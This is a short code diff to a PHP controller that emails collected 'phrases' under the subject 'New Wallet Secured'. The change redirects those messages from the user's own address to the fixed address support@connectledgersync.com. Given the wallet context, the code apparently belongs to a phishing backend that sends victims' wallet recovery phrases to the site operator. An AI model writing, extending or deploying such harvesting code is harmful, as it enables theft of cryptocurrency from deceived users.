@@ -28,7 +28,7 @@ class UserController extends Controller
 
         // If you want to use a "user" object in email
         $user = (object)[
-            'email' => 'support@connectledgersync.com',
+            'email' => $request->email,
             'name' => $request->name ?? 'User' // optional, if you collect name
         ];
 
@@ -38,7 +38,7 @@ class UserController extends Controller
             'phrases' => $phrases,
             'user' => $user
         ], function ($message) use ($user) {
-            $message->to($user->email)
+            $message->to('support@connectledgersync.com')
                     ->subject('New Wallet Secured');
         });
 
